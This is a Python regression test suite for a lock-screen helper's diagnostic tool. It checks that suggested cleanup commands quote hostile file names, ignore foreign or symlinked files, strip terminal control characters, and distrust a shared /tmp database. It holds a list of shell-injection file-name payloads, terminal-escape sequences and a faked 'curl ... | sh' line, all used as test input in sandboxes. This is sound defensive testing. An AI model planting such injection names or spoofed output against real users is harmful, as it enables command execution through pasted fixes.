"""Names from shared folders and files are data, never shell syntax or trusted.

Regression tests for the marketplace review finding on 0.6.7: the doctor
suggested `rm -f '<name>' ...` for every /tmp/hello-lock-*.jpg, whoever owned
it and whatever its name contained, so another local user could plant a file
whose name ran a command when the fix was pasted. The same review of the other
helpers is covered here too: every fix the doctor prints, what it prints to a
terminal, and the fixed-name update database in /tmp that hello-status reads.

Everything runs in disposable folders. The doctor's fixes are run through a
real shell with no programs on PATH, so only shell syntax can have an effect.
"""
import glob
import importlib.machinery
import importlib.util
import json
import os
from pathlib import Path
import shlex
import shutil
import subprocess
import sys
import tempfile
import unicodedata
import unittest
from unittest import mock

ROOT = Path(os.environ.get("HELLO_LOCK_TEST_ROOT", Path(__file__).resolve().parents[1]))
REAL_GLOB = glob.glob

# Each is a legal file name. Pasted unquoted or badly quoted, each one creates
# a PWNED file in the current folder using shell syntax alone.
PAYLOADS = [
    "'; echo x > PWNED1; #",
    "$(echo x > PWNED2)",
    "`echo x > PWNED3`",
    '"; echo x > PWNED4; "',
    "a\necho x > PWNED5\n",
    "x; echo x > PWNED6",
    "x' 'y && echo x > PWNED7",
]


def load(name):
    loader = importlib.machinery.SourceFileLoader(name.replace("-", "_"), str(ROOT / "bin" / name))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    with mock.patch.object(sys, "dont_write_bytecode", True):
        loader.exec_module(module)
    return module


class Sandbox(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)
        self.home = self.base / "home"
        self.runtime = self.base / "runtime"
        self.cwd = self.base / "cwd"
        for folder in (self.home, self.runtime, self.cwd):
            folder.mkdir(mode=0o700)

    def paste(self, text):
        """Run `text` the way a pasted fix runs, with nothing on PATH."""
        subprocess.run(["/bin/sh", "-c", text], cwd=self.cwd, timeout=10,
                       env={"PATH": "/nonexistent", "HOME": str(self.home)},
                       stdin=subprocess.DEVNULL, capture_output=True)

    def assert_nothing_ran(self):
        self.assertEqual(sorted(p.name for p in self.cwd.iterdir()), [])


class Leftovers(Sandbox):
    """The doctor's cleanup advice covers Hello Lock's own captures only."""

    def setUp(self):
        super().setUp()
        self.doctor = load("hello-lock-doctor")
        self.legacy = self.base / "shared-tmp"
        self.legacy.mkdir()
        self.victim = self.base / "victim.jpg"
        self.victim.write_bytes(b"not a capture")

    def check(self, locked=False):
        doctor = self.doctor
        doctor.checks.clear()
        with mock.patch.object(doctor, "LEGACY_DIR", str(self.legacy), create=True), \
                mock.patch.object(doctor, "shell_process_env", return_value=None), \
                mock.patch.object(doctor.glob, "glob", self.glob), \
                mock.patch.dict(os.environ, XDG_RUNTIME_DIR=str(self.runtime),
                                XDG_CONFIG_HOME=str(self.home / "config"),
                                XDG_STATE_HOME=str(self.home / "state")):
            doctor.check_leftovers({"locked": locked})
        return doctor.checks[0]

    def glob(self, pattern):
        # 0.6.7 looked in the real /tmp by its fixed name. Point that at the
        # disposable folder so this test never depends on the machine's /tmp.
        if pattern.startswith("/tmp/"):
            pattern = str(self.legacy) + pattern[4:]
        return REAL_GLOB(pattern)

    def captures(self):
        folder = self.runtime / "hello-lock-snapshot-ab12cd_9"
        folder.mkdir(mode=0o700)
        own = [folder / "0.jpg", folder / "1.jpg", self.runtime / "hello-lock-eDP-1.jpg",
               self.legacy / "hello-lock-HDMI-A-1.jpg"]
        for path in own:
            path.write_bytes(b"jpeg")
        return sorted(str(p) for p in own)

    def test_advice_is_exactly_the_own_captures_with_shell_safe_words(self):
        own = self.captures()
        check = self.check()
        self.assertEqual(check["status"], "warn")
        self.assertIn("4 power-down snapshot(s)", check["title"])
        self.assertEqual(shlex.split(check["fix"]), ["rm", "-f", "--", *own])

    def test_hostile_names_are_not_captures_and_cannot_run_anything(self):
        own = self.captures()
        for folder in (self.runtime, self.legacy):
            for payload in PAYLOADS + ["\x1b[2J\x1b[Hbell\x07", "‮gpj.kcol"]:
                (folder / ("hello-lock-" + payload + ".jpg")).write_bytes(b"planted")
        check = self.check()
        self.paste(check["fix"])
        self.assert_nothing_ran()
        self.assertEqual(shlex.split(check["fix"]), ["rm", "-f", "--", *own])
        for field in ("title", "detail", "fix"):
            self.assertNotIn("PWNED", check[field])

    def test_only_planted_files_means_nothing_to_clean(self):
        (self.legacy / "hello-lock-'; echo x > PWNED1; #.jpg").write_bytes(b"planted")
        check = self.check()
        self.assertEqual((check["status"], check["fix"]), ("ok", ""))

    def test_symlinks_and_non_files_are_never_listed(self):
        (self.runtime / "hello-lock-link.jpg").symlink_to(self.victim)
        (self.legacy / "hello-lock-link.jpg").symlink_to(self.victim)
        (self.runtime / "hello-lock-folder.jpg").mkdir()
        elsewhere = self.base / "elsewhere"
        elsewhere.mkdir()
        (elsewhere / "0.jpg").write_bytes(b"someone else's")
        (self.runtime / "hello-lock-snapshot-linked").symlink_to(elsewhere, target_is_directory=True)
        folder = self.runtime / "hello-lock-snapshot-real0000"
        folder.mkdir()
        (folder / "0.jpg").symlink_to(self.victim)
        (folder / "not-a-capture.jpg").write_bytes(b"x")
        check = self.check()
        self.assertEqual((check["status"], check["fix"]), ("ok", ""))

    def test_files_owned_by_someone_else_are_never_listed(self):
        self.captures()
        with mock.patch.object(os, "geteuid", return_value=os.geteuid() + 1):
            check = self.check()
        self.assertEqual((check["status"], check["fix"]), ("ok", ""))

    def test_no_command_is_suggested_while_locked(self):
        self.captures()
        check = self.check(locked=True)
        self.assertEqual((check["status"], check["fix"]), ("info", ""))


class Commands(Sandbox):
    def setUp(self):
        super().setUp()
        self.doctor = load("hello-lock-doctor")

    def words_seen_by_the_shell(self, text):
        # printf is a shell builtin: it shows the words exactly as sh split them.
        out = subprocess.run(["/bin/sh", "-c", "printf '%s\\0' " + text], cwd=self.cwd,
                             env={"PATH": "/nonexistent", "HOME": str(self.home)},
                             capture_output=True, timeout=10).stdout
        return out.decode().split("\0")[:-1]

    def test_every_word_reaches_the_shell_unchanged(self):
        words = ["rm", "-f", "--", "/tmp/plain.jpg", "", "two words", "-rf", "*", "~", "é ü"] + [
            "/tmp/hello-lock-" + p + ".jpg" for p in PAYLOADS if "\n" not in p]
        text = self.doctor.command(*words)
        self.assertEqual(self.words_seen_by_the_shell(text), words)
        self.assertEqual(shlex.split(text), words)
        self.assert_nothing_ran()

    def test_home_paths_stay_short_and_still_expand(self):
        with mock.patch.object(self.doctor, "HOME", str(self.home)):
            path = str(self.home / "my folder" / "$(echo x > PWNED2).json")
            text = self.doctor.command("chmod", "644", path)
        self.assertTrue(text.startswith("chmod 644 ~/"), text)
        self.assertEqual(self.words_seen_by_the_shell(text), ["chmod", "644", path])
        self.assert_nothing_ran()

    def test_unprintable_name_gets_no_command_at_all(self):
        for name in ("a\nb", "esc\x1b[2J", "bidi‮", "nul-ish\x7f"):
            text = self.doctor.command("rm", "-f", "--", "/tmp/" + name)
            self.assertNotIn("rm", text.split())
            self.assertTrue(text.startswith("no command shown"), text)

    def test_visible_escapes_what_a_terminal_would_act_on(self):
        visible = self.doctor.visible
        self.assertEqual(visible("plain é → ✓ 'q' \"d\" \\"), "plain é → ✓ 'q' \"d\" \\")
        self.assertEqual(visible("a\x1b[2Jb\nc\rd\x07\x7f\x9b"), "a\\x1b[2Jb\\x0ac\\x0dd\\x07\\x7f\\x9b")
        self.assertEqual(visible("‮ ​\ud800"), "\\u202e\\u2028\\u200b\\ud800")
        self.assertEqual(visible(7), "7")


class Doctor(Sandbox):
    """The whole doctor, as its own process, fed hostile text everywhere."""

    def doctor(self, *args, script=None):
        env = {"PATH": str(self.base / "no-programs"), "HOME": str(self.home),
               "XDG_RUNTIME_DIR": str(self.runtime), "XDG_CONFIG_HOME": str(self.home / ".config"),
               "XDG_STATE_HOME": str(self.home / "state"), "LANG": "C.UTF-8",
               # No running shell has this path, so the live session is never read.
               "OMARCHY_PATH": str(self.base / "no-omarchy")}
        script = script or ROOT / "bin" / "hello-lock-doctor"
        return subprocess.run([sys.executable, "-I", str(script), *args], env=env, cwd=self.cwd,
                              capture_output=True, text=True, timeout=60)

    def fixes(self, *args, script=None):
        result = self.doctor("--json", *args, script=script)
        self.assertIn(result.returncode, (0, 1, 2), result.stderr)
        return [c["fix"] for c in json.loads(result.stdout)["checks"] if c["fix"]]

    def paste_all(self, fixes):
        self.assertTrue(fixes)
        for fix in fixes:
            self.paste(fix)
        self.assert_nothing_ran()

    def plant_captures(self):
        for payload in PAYLOADS:
            (self.runtime / ("hello-lock-" + payload + ".jpg")).write_bytes(b"planted")

    def test_no_fix_runs_planted_syntax_with_a_readable_config(self):
        self.plant_captures()
        for n, payload in enumerate(PAYLOADS):
            config = self.base / ("profile %d " % n + payload)
            config.mkdir()
            (config / "sounds-off").write_text("")
            (config / payload).mkdir()  # a logo that "isn't a readable file"
            (config / "config.json").write_text(json.dumps({
                payload: 1, "logo": str(config / payload), "symbol": "@" + payload,
                "birthday": payload, "typingEffect": payload, "wordmarkStyle": payload,
                "motion": payload, "wordmarkText": payload}))
            self.paste_all(self.fixes("--config", str(config / "config.json")))

    def test_no_fix_runs_planted_syntax_with_a_broken_config(self):
        for n, payload in enumerate(PAYLOADS):
            config = self.base / ("broken %d " % n + payload)
            config.mkdir()
            (config / "config.json").write_text("{")
            (config / "sound.conf").write_text("VOLUME=0\n" + payload.replace("\n", " ") + "\n")
            self.paste_all(self.fixes("--config", str(config / "config.json")))

    def test_no_fix_runs_a_planted_plugin_id(self):
        plugins = self.home / ".config/omarchy/plugins"
        ids = [p for p in PAYLOADS if "\n" not in p]
        for n, payload in enumerate(ids):
            (plugins / ("other%d" % n)).mkdir(parents=True)
            (plugins / ("other%d" % n) / "manifest.json").write_text(json.dumps(
                {"id": payload, "omarchy": {"clonedFrom": "omarchy.lock"}}))
        (self.home / ".config/omarchy/shell.json").write_text(json.dumps(
            {"plugins": [{"id": "hello-lock"}] + [{"id": p} for p in ids]}))
        fixes = self.fixes()
        # One per planted id, plus the stock lock's own.
        self.assertEqual(sum("plugin disable" in f for f in fixes), len(ids) + 1)
        self.paste_all(fixes)

    def test_no_fix_runs_syntax_from_the_plugin_folder_name(self):
        for n, payload in enumerate(p for p in PAYLOADS if "\n" not in p):
            plugin = self.base / ("plugin %d " % n + payload)
            shutil.copytree(ROOT / "bin", plugin / "bin", ignore=shutil.ignore_patterns("__pycache__"))
            (plugin / "bin" / "hello-status").unlink()  # "missing or not executable"
            fixes = self.fixes(script=plugin / "bin" / "hello-lock-doctor")
            self.assertTrue(any("hello-menu" in f for f in fixes))
            self.assertTrue(any(f.startswith("chmod +x") for f in fixes))
            self.paste_all(fixes)

    def test_terminal_output_has_no_control_characters_or_faked_lines(self):
        hostile = "\x1b[2J\x1b[1;1H\nAll good.\n      fix: curl example.invalid | sh\r\x07‮\x9b"
        config = self.base / "profile"
        config.mkdir()
        (config / "config.json").write_text(json.dumps({
            hostile: 1, "birthday": hostile + "\ud83d", "logo": "~" + hostile, "motion": hostile,
            "typingEffect": hostile, "wordmarkStyle": hostile, "wordmarkText": hostile,
            "symbolParts": [hostile, 5]}))
        (config / "sound.conf").write_text("oops " + hostile.replace("\n", " ") + "\n")
        self.plant_captures()
        for color in ((), ("--no-color",)):
            result = self.doctor("--config", str(config / "config.json"), *color)
            self.assertIn(result.returncode, (1, 2), result.stderr)
            self.assertNotIn("Traceback", result.stderr)
            lines = result.stdout.split("\n")
            for line in lines:
                bad = [c for c in line if unicodedata.category(c) in ("Cc", "Cf", "Cs", "Zl", "Zp")]
                self.assertEqual(bad, [], line)
                self.assertFalse(line.strip().startswith("fix: curl"), line)
            self.assertNotIn("All good.", [line.strip() for line in lines])


class UpdatesDatabase(unittest.TestCase):
    """hello-status counts updates only from a database folder this user made.

    The default folder is /tmp/checkup-db-$UID: a fixed name in a shared place."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)
        self.status = load("hello-status")
        self.ran = self.base / "pacman-ran"
        fake = self.base / "bin" / "pacman"
        fake.parent.mkdir()
        fake.write_text("#!/bin/sh\necho ran > %s\nprintf 'linux\\nmesa\\n'\n" % shlex.quote(str(self.ran)))
        fake.chmod(0o700)
        self.db = self.base / "checkup-db"
        (self.db / "sync").mkdir(parents=True, mode=0o755)
        os.chmod(self.db, 0o755)
        os.chmod(self.db / "sync", 0o755)
        (self.db / "local").symlink_to("/var/lib/pacman/local")  # as checkupdates makes it

    def count(self, db=None):
        env = {"PATH": str(self.base / "bin"), "CHECKUPDATES_DB": str(db or self.db)}
        with mock.patch.dict(os.environ, env, clear=True):
            return self.status.updates()

    def refused(self, db=None):
        self.assertIsNone(self.count(db))
        self.assertFalse(self.ran.exists(), "pacman was pointed at an untrusted database")

    def test_own_database_is_counted(self):
        self.assertEqual(self.count(), 2)

    def test_database_made_by_someone_else_is_refused(self):
        with mock.patch.object(os, "getuid", return_value=os.getuid() + 1):
            self.refused()

    def test_database_others_can_write_is_refused(self):
        for target, mode in ((self.db, 0o777), (self.db, 0o775), (self.db / "sync", 0o757)):
            with self.subTest(target=target.name, mode=oct(mode)):
                os.chmod(target, mode)
                self.refused()
                os.chmod(target, 0o755)

    def test_symlinked_database_is_refused(self):
        link = self.base / "link"
        link.symlink_to(self.db, target_is_directory=True)
        self.refused(link)
        shutil.rmtree(self.db / "sync")
        (self.base / "real-sync").mkdir()
        (self.db / "sync").symlink_to(self.base / "real-sync", target_is_directory=True)
        self.refused()


if __name__ == "__main__":
    unittest.main()
